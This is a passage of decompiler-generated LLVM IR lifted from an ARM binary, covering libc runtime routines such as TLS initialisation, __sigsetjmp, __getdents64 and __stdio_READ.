  %v2_19890 = icmp eq i32 %v0_19890, 0
  %v1_19894 = load i32, i32* %r8.global-to-local, align 4
  %v2_19894 = add i32 %v1_19894, 44
  %v3_19894 = inttoptr i32 %v2_19894 to i32*
  store i32 1, i32* %v3_19894, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_1989c = load i32, i32* %sl.global-to-local, align 4
  %v1_1989c = load i32, i32* %r1.global-to-local, align 4
  %v2_1989c = add i32 %v1_1989c, %v0_1989c
  store i32 %v2_1989c, i32* %r2.global-to-local, align 4
  %v1_198a0 = load i32, i32* @r6, align 4
  br i1 %v2_19890, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_197b4
  store i32 %v1_198a0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_198ac34 = load i32, i32* %r8.global-to-local, align 4
  %v2_198ac35 = add i32 %v1_198ac34, 32
  %v3_198ac36 = inttoptr i32 %v2_198ac35 to i32*
  store i32 %v1_198a0, i32* %v3_198ac36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_197b4
  %v2_198a4 = add i32 %v1_198a0, -1
  store i32 %v2_198a4, i32* %r0.global-to-local, align 4
  %v1_198ac = load i32, i32* %r8.global-to-local, align 4
  %v2_198ac = add i32 %v1_198ac, 32
  %v3_198ac = inttoptr i32 %v2_198ac to i32*
  store i32 %v1_198a0, i32* %v3_198ac, align 4
  %v1_198b0 = load i32, i32* @r6, align 4
  store i32 %v1_198b0, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_198b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_198b4 = load i32, i32* %r2.global-to-local, align 4
  %v2_198b4 = add i32 %v1_198b4, 28
  %v3_198b4 = inttoptr i32 %v2_198b4 to i32*
  store i32 %v0_198b4, i32* %v3_198b4, align 4
  %v0_198b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_198b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_198b8 = inttoptr i32 %v1_198b8 to i32*
  store i32 %v0_198b8, i32* %v2_198b8, align 4
  %v0_198bc = load i32, i32* %r0.global-to-local, align 4
  %v1_198bc = load i32, i32* %r3.global-to-local, align 4
  %v2_198bc = add i32 %v1_198bc, %v0_198bc
  store i32 %v2_198bc, i32* %r0.global-to-local, align 4
  %v1_198c0 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_19890, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_198c8.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_198c8 = phi i32 [ %v0_198c8.pre, %._crit_edge ], [ %v1_198c0, %bb54 ]
  %v2_198c4 = udiv i32 %v2_198bc, %v1_198c0
  %v2_198c8 = load i32, i32* %sb.global-to-local, align 4
  %v3_198c8 = mul i32 %v2_198c4, %v0_198c8
  %v4_198c8 = add i32 %v2_198c8, %v3_198c8
  store i32 %v4_198c8, i32* @r0, align 4
  %v0_198cc = load i32, i32* %fp.global-to-local, align 4
  %v2_198cc = icmp ult i32 %v0_198cc, 16
  %v0_198cc. = select i1 %v2_198cc, i32 16, i32 %v0_198cc
  store i32 %v0_198cc., i32* @r1, align 4
  %v2_198dc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_198dc, i32* @r4, align 4
  store i32 %v6_196f8, i32* @r5, align 4
  store i32 %v15_196f8, i32* %r8.global-to-local, align 4
  store i32 %v18_196f8, i32* %sb.global-to-local, align 4
  store i32 %v21_196f8, i32* %sl.global-to-local, align 4
  store i32 %v24_196f8, i32* %fp.global-to-local, align 4
  store i32 %v27_196f8, i32* @lr, align 4
  %v0_198e0 = call i32 @init_static_tls()
  store i32 %v0_198e0, i32* %r0.global-to-local, align 4
  %v0_198ec.pre = load i32, i32* @ip, align 4
  %v1_197b4.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_197c4.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_198e4

dec_label_pc_19770.dec_label_pc_198e4.loopexit_crit_edge: ; preds = %dec_label_pc_1976c
  br label %dec_label_pc_198e4.loopexit

dec_label_pc_198e4.loopexit:                      ; preds = %dec_label_pc_19770.dec_label_pc_198e4.loopexit_crit_edge, %dec_label_pc_19724
  br label %dec_label_pc_198e4

dec_label_pc_198e4:                               ; preds = %dec_label_pc_198e4.loopexit, %entry, %bb55
  %v0_197c4.pre.pre = phi i32 [ ptrtoint (i32* @global_var_240f8.537 to i32), %dec_label_pc_198e4.loopexit ], [ ptrtoint (i32* @global_var_240f8.537 to i32), %entry ], [ %v0_197c4.pre.pre.pre, %bb55 ]
  %v1_197b4.pre.pre = phi i32 [ %v0_19718, %dec_label_pc_198e4.loopexit ], [ %v0_19718, %entry ], [ %v1_197b4.pre.pre.pre, %bb55 ]
  %v0_198ec = phi i32 [ %v0_1971c, %dec_label_pc_198e4.loopexit ], [ %v0_1971c, %entry ], [ %v0_198ec.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_198ec, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_197b0

; uselistorder directives
  uselistorder i32 %v0_198ec, { 1, 0 }
  uselistorder i32 %v1_198a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1980c, { 1, 0 }
  uselistorder i32 %v2_19808, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1976c, { 2, 1, 0 }
  uselistorder i32 %v3_19744, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_1974c66, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %v1_19770, { 1, 0 }
  uselistorder i32 %v0_1971c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_19718, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1970c, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 6, 2, 3, 4, 5, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 9, 10, 11, 12, 13, 14, 15, 5, 2, 3, 4, 0, 6, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r1.global-to-local, { 7, 6, 8, 9, 10, 0, 5, 4, 3, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 7, 6, 8, 9, 10, 11, 12, 4, 0, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0 }
  uselistorder i32 ()* @init_static_tls, { 1, 0 }
  uselistorder i32 10776, { 0, 2, 1 }
  uselistorder i32 84, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 -4096, { 0, 2, 1, 4, 3, 6, 5, 7, 8 }
  uselistorder i32 62, { 1, 2, 0 }
  uselistorder i32 (i32)* @__GI_sbrk, { 0, 3, 2, 1, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_198e4, { 0, 2, 1 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %dec_label_pc_197b4, { 1, 0 }
  uselistorder label %dec_label_pc_197b0, { 1, 0 }
  uselistorder label %dec_label_pc_19734, { 1, 0 }
}

define i32 @function_19904(i32 %arg1) local_unnamed_addr {
dec_label_pc_19904:
  %v0_19904 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19904, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_19904
  %v1_19908 = load i32, i32* @ip, align 4
  %v1_19918 = load i32, i32* @r5, align 4
  %v2_1991c = load i32, i32* @r4, align 4
  %v2_19918 = and i32 %v1_19908, 104736
  %v9_1991c = and i32 %v2_19918, %v1_19918
  %v9_19920 = and i32 %v9_1991c, %v2_1991c
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_19904, %bb
  %v10_19924 = phi i32 [ %arg1, %dec_label_pc_19904 ], [ %v9_19920, %bb ]
  ret i32 %v10_19924

; uselistorder directives
  uselistorder label %.thread7, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v2_19930 = call i32 @__libc_setup_tls(i32 8, i32 16)
  ret i32 %v2_19930
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r2.global-to-local, align 4
  %v4_19940 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 156) to i32*), align 4
  %v4_19948 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 104) to i32*), align 4
  store i32 %v4_19948, i32* %r1.global-to-local, align 4
  %v1_1994c = add i32 %arg1, 44
  %v2_1994c = inttoptr i32 %v1_1994c to i32*
  %v3_1994c = load i32, i32* %v2_1994c, align 4
  %v1_19950 = add i32 %arg1, 28
  %v2_19950 = inttoptr i32 %v1_19950 to i32*
  %v3_19950 = load i32, i32* %v2_19950, align 4
  store i32 %v3_19950, i32* %r2.global-to-local, align 4
  %v2_19954 = inttoptr i32 %v4_19940 to i32*
  store i32 %v3_1994c, i32* %v2_19954, align 4
  %v0_19958 = load i32, i32* %r2.global-to-local, align 4
  %v1_19958 = load i32, i32* %r1.global-to-local, align 4
  %v2_19958 = inttoptr i32 %v1_19958 to i32*
  store i32 %v0_19958, i32* %v2_19958, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 104, { 0, 1, 2, 6, 8, 3, 7, 4, 9, 5, 10 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 156) to i32*), { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_19964(i32 %arg1) local_unnamed_addr {
dec_label_pc_19964:
  %v0_19964 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_19964, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_19964
  %v1_19964 = load i32, i32* @ip, align 4
  %v3_19964 = mul i32 %v1_19964, %arg1
  %v2_19968 = load i32, i32* @r8, align 4
  %v4_19968 = and i32 %v2_19968, %v3_19964
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_19964, %bb
  %v5_19968 = phi i32 [ %arg1, %dec_label_pc_19964 ], [ %v4_19968, %bb ]
  ret i32 %v5_19968

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_dl_nothread_init_static_tls(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r4, align 4
  %v1_19974 = add i32 %arg1, 40
  store i32 %v1_19974, i32* %r2.global-to-local, align 4
  %v1_19978 = inttoptr i32 %v1_19974 to i32*
  %v2_19978 = load i32, i32* %v1_19978, align 4
  store i32 %v2_19978, i32* %r2.global-to-local, align 4
  %v3_19978 = add i32 %arg1, 44
  %v4_19978 = inttoptr i32 %v3_19978 to i32*
  %v5_19978 = load i32, i32* %v4_19978, align 4
  store i32 %v5_19978, i32* %r3.global-to-local, align 4
  %v0_1997c = call i32 @__aeabi_read_tp()
  %v1_19980 = inttoptr i32 %v0_1997c to i32*
  %v2_19980 = load i32, i32* %v1_19980, align 4
  store i32 %v2_19980, i32* %r1.global-to-local, align 4
  %v3_19984 = mul i32 %v5_19978, 8
  store i32 %v3_19984, i32* %r3.global-to-local, align 4
  %v1_19988 = load i32, i32* %r2.global-to-local, align 4
  %v2_19988 = add i32 %v1_19988, %v0_1997c
  %v3_1998c = add i32 %v3_19984, %v2_19980
  %v4_1998c = inttoptr i32 %v3_1998c to i32*
  store i32 %v2_19988, i32* %v4_1998c, align 4
  %v0_19990 = load i32, i32* %r3.global-to-local, align 4
  %v1_19990 = load i32, i32* %r1.global-to-local, align 4
  %v2_19990 = add i32 %v1_19990, %v0_19990
  store i32 %v2_19990, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v4_19998 = add i32 %v2_19990, 4
  %v5_19998 = inttoptr i32 %v4_19998 to i8*
  store i8 1, i8* %v5_19998, align 1
  %v0_1999c = load i32, i32* @r4, align 4
  %v1_1999c = add i32 %v0_1999c, 20
  store i32 %v1_1999c, i32* %r1.global-to-local, align 4
  %v1_199a0 = inttoptr i32 %v1_1999c to i32*
  %v2_199a0 = load i32, i32* %v1_199a0, align 4
  store i32 %v2_199a0, i32* @r1, align 4
  %v3_199a0 = add i32 %v0_1999c, 24
  %v4_199a0 = inttoptr i32 %v3_199a0 to i32*
  %v5_199a0 = load i32, i32* %v4_199a0, align 4
  store i32 %v5_199a0, i32* %r2.global-to-local, align 4
  %v5_199a4 = call i32 @__GI_mempcpy(i32 %v2_19988, i32 %v2_199a0, i32 %v5_199a0, i32 1)
  %v0_199a8 = load i32, i32* @r4, align 4
  %v1_199a8 = add i32 %v0_199a8, 28
  store i32 %v1_199a8, i32* %r3.global-to-local, align 4
  %v1_199ac = inttoptr i32 %v1_199a8 to i32*
  %v2_199ac = load i32, i32* %v1_199ac, align 4
  store i32 %v2_199ac, i32* %r2.global-to-local, align 4
  %v3_199ac = add i32 %v0_199a8, 24
  %v4_199ac = inttoptr i32 %v3_199ac to i32*
  %v5_199ac = load i32, i32* %v4_199ac, align 4
  store i32 %v5_199ac, i32* %r3.global-to-local, align 4
  %v2_199b0 = sub i32 %v5_199ac, %v2_199ac
  store i32 %v2_199b0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_199b8 = inttoptr i32 %v5_199a4 to i8*
  %v4_199b8 = call i32 @__GI_memset(i8* %v3_199b8, i32 0, i32 %v2_199b0)
  ret i32 %v4_199b8

; uselistorder directives
  uselistorder i32 %v3_19984, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 5, 0, 1, 2, 4, 3, 12, 11, 9, 6, 7, 8, 10 }
  uselistorder i8 1, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
dec_label_pc_19a08:
  store i32 %arg1, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32 11604) to i32*), align 4
  ret i32 0
}

define i32 @__sigsetjmp() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v0_19a1c = load i32, i32* @r0, align 4
  %v1_19a20 = inttoptr i32 %v0_19a1c to i32*
  %v2_19a20 = load i32, i32* @r4, align 4
  store i32 %v2_19a20, i32* %v1_19a20, align 4
  %v3_19a20 = add i32 %v0_19a1c, 4
  %v4_19a20 = inttoptr i32 %v3_19a20 to i32*
  %v5_19a20 = load i32, i32* @r5, align 4
  store i32 %v5_19a20, i32* %v4_19a20, align 4
  %v6_19a20 = add i32 %v0_19a1c, 8
  %v7_19a20 = inttoptr i32 %v6_19a20 to i32*
  %v8_19a20 = load i32, i32* @r6, align 4
  store i32 %v8_19a20, i32* %v7_19a20, align 4
  %v9_19a20 = add i32 %v0_19a1c, 12
  %v10_19a20 = inttoptr i32 %v9_19a20 to i32*
  %v11_19a20 = load i32, i32* @r7, align 4
  store i32 %v11_19a20, i32* %v10_19a20, align 4
  %v12_19a20 = add i32 %v0_19a1c, 16
  %v13_19a20 = inttoptr i32 %v12_19a20 to i32*
  %v14_19a20 = load i32, i32* @r8, align 4
  store i32 %v14_19a20, i32* %v13_19a20, align 4
  %v15_19a20 = add i32 %v0_19a1c, 20
  %v16_19a20 = inttoptr i32 %v15_19a20 to i32*
  %v17_19a20 = load i32, i32* @sb, align 4
  store i32 %v17_19a20, i32* %v16_19a20, align 4
  %v18_19a20 = add i32 %v0_19a1c, 24
  %v19_19a20 = inttoptr i32 %v18_19a20 to i32*
  %v20_19a20 = load i32, i32* @sl, align 4
  store i32 %v20_19a20, i32* %v19_19a20, align 4
  %v21_19a20 = add i32 %v0_19a1c, 28
  %v22_19a20 = inttoptr i32 %v21_19a20 to i32*
  %v23_19a20 = load i32, i32* @fp, align 4
  store i32 %v23_19a20, i32* %v22_19a20, align 4
  %v24_19a20 = add i32 %v0_19a1c, 32
  %v25_19a20 = inttoptr i32 %v24_19a20 to i32*
  %v27_19a20 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v27_19a20, i32* %v25_19a20, align 4
  %v28_19a20 = add i32 %v0_19a1c, 36
  %v29_19a20 = inttoptr i32 %v28_19a20 to i32*
  %v30_19a20 = load i32, i32* @lr, align 4
  store i32 %v30_19a20, i32* %v29_19a20, align 4
  %v0_19a24 = call i32 @__sigjmp_save()
  ret i32 %v0_19a24

; uselistorder directives
  uselistorder i32 %v0_19a1c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @fp, { 103, 104, 15, 16, 17, 18, 19, 20, 21, 22, 83, 84, 85, 86, 99, 101, 100, 102, 1, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 7, 8, 2, 3, 4, 5, 6, 9, 10, 88, 87, 93, 94, 89, 90, 91, 92, 23, 24, 25, 26, 27, 28, 29, 30, 31, 42, 43, 0, 44, 45, 46, 47, 48, 49, 11, 12, 13, 14, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 63, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 95, 96, 97, 98, 105 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v6_19a2c = load i32, i32* @r5, align 4
  %v12_19a2c = load i32, i32* @r7, align 4
  %v1_19a30 = add i32 %arg3, 14
  %v2_19a38 = ptrtoint i32* %stack_var_-72 to i32
  %v1_19a3c = and i32 %v1_19a30, -8
  %v2_19a40 = sub i32 %v2_19a38, %v1_19a3c
  %v1_19a44 = add i32 %v2_19a40, 8
  store i32 %tmp, i32* %sl.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %tmp23 = icmp ult i32 %arg1, -4095
  br i1 %tmp23, label %dec_label_pc_19a88, label %dec_label_pc_19a6c

dec_label_pc_19a6c:                               ; preds = %entry
  %v1_19a70 = sub i32 0, %arg1
  %v3_19a74 = load i16, i16* @global_var_24150.533, align 2
  %v4_19a74 = sext i16 %v3_19a74 to i32
  %v0_19a78 = call i32 @__aeabi_read_tp()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19a80 = add i32 %v4_19a74, %v0_19a78
  %v4_19a80 = inttoptr i32 %v3_19a80 to i32*
  store i32 %v1_19a70, i32* %v4_19a80, align 4
  br label %dec_label_pc_19b58

dec_label_pc_19a88:                               ; preds = %entry
  br i1 false, label %dec_label_pc_19b58, label %dec_label_pc_19a90

dec_label_pc_19a90:                               ; preds = %dec_label_pc_19a88
  %v2_19a90 = add i32 %v1_19a44, %arg1
  store i32 %v2_19a90, i32* %r1.global-to-local, align 4
  %v2_19a94 = add i32 %tmp, %arg3
  store i32 %v1_19a44, i32* @r7, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19b40

dec_label_pc_19ab0:                               ; preds = %dec_label_pc_19b40
  %v1_19ab0 = add i32 %v0_19b10, 16
  %v2_19ab0 = inttoptr i32 %v1_19ab0 to i16*
  %v3_19ab0 = load i16, i16* %v2_19ab0, align 2
  %v4_19ab0 = zext i16 %v3_19ab0 to i32
  %v1_19ab4 = add nsw i32 %v4_19ab0, -19
  store i32 %v1_19ab4, i32* @r2, align 4
  %v1_19ab8 = add nuw nsw i32 %v4_19ab0, 7
  %v1_19abc = and i32 %v1_19ab8, 131064
  store i32 %v1_19abc, i32* @ip, align 4
  %v2_19ac4 = add i32 %v1_19abc, %v0_19b18
  store i32 %v2_19ac4, i32* %r6.global-to-local, align 4
  %tmp24 = icmp ugt i32 %v2_19ac4, %v2_19a94
  br i1 %tmp24, label %dec_label_pc_19ad0, label %dec_label_pc_19b0c

dec_label_pc_19ad0:                               ; preds = %dec_label_pc_19ab0
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19ad8 = load i32, i32* %r8.global-to-local, align 4
  %v0_19adc = load i32, i32* %sb.global-to-local, align 4
  %v1_19ae0 = load i32, i32* @sp, align 4
  %v2_19ae0 = inttoptr i32 %v1_19ae0 to i32*
  store i32 0, i32* %v2_19ae0, align 4
  %v4_19ae4 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_19ad8, i32 %v0_19adc)
  %v0_19ae8 = load i32, i32* @r5, align 4
  %v1_19ae8 = load i32, i32* %sl.global-to-local, align 4
  %v9_19ae8 = icmp eq i32 %v0_19ae8, %v1_19ae8
  br i1 %v9_19ae8, label %dec_label_pc_19af0, label %dec_label_pc_19b54

dec_label_pc_19af0:                               ; preds = %dec_label_pc_19ad0
  %v0_19af4 = call i32 @__aeabi_read_tp()
  %v3_19af8 = load i16, i16* @global_var_24150.533, align 2
  %v4_19af8 = sext i16 %v3_19af8 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_19b04 = add i32 %v4_19af8, %v0_19af4
  %v4_19b04 = inttoptr i32 %v3_19b04 to i32*
  store i32 22, i32* %v4_19b04, align 4
  br label %dec_label_pc_19b58

dec_label_pc_19b0c:                               ; preds = %dec_label_pc_19ab0
  %v1_19b0c = inttoptr i32 %v0_19b10 to i32*
  %v2_19b0c = load i32, i32* %v1_19b0c, align 4
  %v3_19b0c = add i32 %v0_19b10, 4
  %v4_19b0c = inttoptr i32 %v3_19b0c to i32*
  %v5_19b0c = load i32, i32* %v4_19b0c, align 4
  store i32 %v5_19b0c, i32* @r4, align 4
  %v1_19b10 = add i32 %v0_19b10, 8
  store i32 %v1_19b10, i32* %r8.global-to-local, align 4
  %v1_19b14 = inttoptr i32 %v1_19b10 to i32*
  %v2_19b14 = load i32, i32* %v1_19b14, align 4
  store i32 %v2_19b14, i32* %r8.global-to-local, align 4
  %v3_19b14 = add i32 %v0_19b10, 12
  %v4_19b14 = inttoptr i32 %v3_19b14 to i32*
  %v5_19b14 = load i32, i32* %v4_19b14, align 4
  store i32 %v5_19b14, i32* %sb.global-to-local, align 4
  %v1_19b18 = inttoptr i32 %v0_19b18 to i32*
  store i32 %v2_19b0c, i32* %v1_19b18, align 4
  %v3_19b18 = add i32 %v0_19b18, 4
  %v4_19b18 = inttoptr i32 %v3_19b18 to i32*
  %v5_19b18 = load i32, i32* @r4, align 4
  store i32 %v5_19b18, i32* %v4_19b18, align 4
  %v0_19b1c = load i32, i32* %r8.global-to-local, align 4
  %v1_19b1c = load i32, i32* @r5, align 4
  %v2_19b1c = add i32 %v1_19b1c, 8
  %v3_19b1c = inttoptr i32 %v2_19b1c to i32*
  store i32 %v0_19b1c, i32* %v3_19b1c, align 4
  %v0_19b20 = load i32, i32* %sb.global-to-local, align 4
  %v1_19b20 = load i32, i32* @r5, align 4
  %v2_19b20 = add i32 %v1_19b20, 12
  %v3_19b20 = inttoptr i32 %v2_19b20 to i32*
  store i32 %v0_19b20, i32* %v3_19b20, align 4
  %v0_19b24 = load i32, i32* @ip, align 4
  %v1_19b24 = trunc i32 %v0_19b24 to i16
  %v2_19b24 = load i32, i32* @r5, align 4
  %v3_19b24 = add i32 %v2_19b24, 16
  %v4_19b24 = inttoptr i32 %v3_19b24 to i16*
  store i16 %v1_19b24, i16* %v4_19b24, align 2
  %v0_19b28 = load i32, i32* @r7, align 4
  %v1_19b28 = add i32 %v0_19b28, 18
  %v2_19b28 = inttoptr i32 %v1_19b28 to i8*
  %v3_19b28 = load i8, i8* %v2_19b28, align 1
  %v4_19b28 = zext i8 %v3_19b28 to i32
  store i32 %v4_19b28, i32* @r3, align 4
  %v2_19b2c = load i32, i32* @r5, align 4
  %v3_19b2c = add i32 %v2_19b2c, 18
  %v4_19b2c = inttoptr i32 %v3_19b2c to i8*
  store i8 %v3_19b28, i8* %v4_19b2c, align 1
  %v0_19b30 = call i32 @memcpy()
  %v0_19b34 = load i32, i32* @r7, align 4
  %v1_19b34 = add i32 %v0_19b34, 16
  %v2_19b34 = inttoptr i32 %v1_19b34 to i16*
  %v3_19b34 = load i16, i16* %v2_19b34, align 2
  %v4_19b34 = zext i16 %v3_19b34 to i32
  %v0_19b38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_19b38, i32* @r5, align 4
  %v2_19b3c = add i32 %v4_19b34, %v0_19b34
  store i32 %v2_19b3c, i32* @r7, align 4
  br label %dec_label_pc_19b40

dec_label_pc_19b40:                               ; preds = %dec_label_pc_19a90, %dec_label_pc_19b0c
  %v0_19b18 = phi i32 [ %tmp, %dec_label_pc_19a90 ], [ %v0_19b38, %dec_label_pc_19b0c ]
  %v0_19b10 = phi i32 [ %v1_19a44, %dec_label_pc_19a90 ], [ %v2_19b3c, %dec_label_pc_19b0c ]
  %v3_19b44 = icmp ult i32 %v0_19b10, %v2_19a90
  %v1_19b48 = add i32 %v0_19b18, 19
  store i32 %v1_19b48, i32* @r0, align 4
  %v1_19b4c = add i32 %v0_19b10, 19
  store i32 %v1_19b4c, i32* @r1, align 4
  br i1 %v3_19b44, label %dec_label_pc_19ab0, label %dec_label_pc_19b54.loopexit

dec_label_pc_19b54.loopexit:                      ; preds = %dec_label_pc_19b40
  %v0_19b54.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19b54

dec_label_pc_19b54:                               ; preds = %dec_label_pc_19b54.loopexit, %dec_label_pc_19ad0
  %v1_19b54 = phi i32 [ %v0_19b18, %dec_label_pc_19b54.loopexit ], [ %v0_19ae8, %dec_label_pc_19ad0 ]
  %v0_19b54 = phi i32 [ %v0_19b54.pre, %dec_label_pc_19b54.loopexit ], [ %v1_19ae8, %dec_label_pc_19ad0 ]
  %v2_19b54 = sub i32 %v1_19b54, %v0_19b54
  store i32 %v2_19b54, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_19b58

dec_label_pc_19b58:                               ; preds = %dec_label_pc_19a88, %dec_label_pc_19af0, %dec_label_pc_19a6c, %dec_label_pc_19b54
  %v0_19b58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_19a2c, i32* @r5, align 4
  store i32 %v12_19a2c, i32* @r7, align 4
  ret i32 %v0_19b58

; uselistorder directives
  uselistorder i32 %v0_19b10, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_19b18, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_19a44, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 12, 13, 0, 3, 14, 4, 15, 5, 9, 6, 10, 7, 11, 18, 1, 16, 2, 17, 8 }
  uselistorder i32 18, { 11, 12, 0, 13, 1, 8, 2, 9, 3, 10, 7, 14, 4, 15, 5, 16, 6, 17 }
  uselistorder i32 22, { 1, 0, 14, 2, 3, 4, 15, 5, 6, 16, 7, 11, 8, 12, 9, 13, 17, 10, 18 }
  uselistorder i32* @sp, { 4, 5, 1, 6, 0, 7, 2, 8, 3 }
  uselistorder i32 -8, { 37, 16, 17, 18, 19, 20, 21, 15, 14, 9, 13, 12, 11, 10, 22, 23, 24, 25, 26, 8, 39, 27, 28, 29, 30, 31, 38, 40, 32, 41, 36, 33, 34, 35, 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_19b58, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_19b40, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_19b70 = load i32, i32* @r4, align 4
  store i32 %v3_19b70, i32* %stack_var_-12, align 4
  %v0_19b74 = load i32, i32* %r0.global-to-local, align 4
  %v1_19b74 = inttoptr i32 %v0_19b74 to i16*
  %v2_19b74 = load i16, i16* %v1_19b74, align 2
  %v3_19b74 = zext i16 %v2_19b74 to i32
  store i32 %v3_19b74, i32* @r3, align 4
  %v1_19b78 = and i32 %v3_19b74, 4
  store i32 %v1_19b78, i32* @r5, align 4
  %v2_19b78 = icmp eq i32 %v1_19b78, 0
  store i32 %v0_19b74, i32* @r4, align 4
  br i1 %v2_19b78, label %dec_label_pc_19b8c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_19b8c:                               ; preds = %entry
  %v1_19b8c = icmp slt i32 %arg2, 0
  br i1 %v1_19b8c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_19b8c
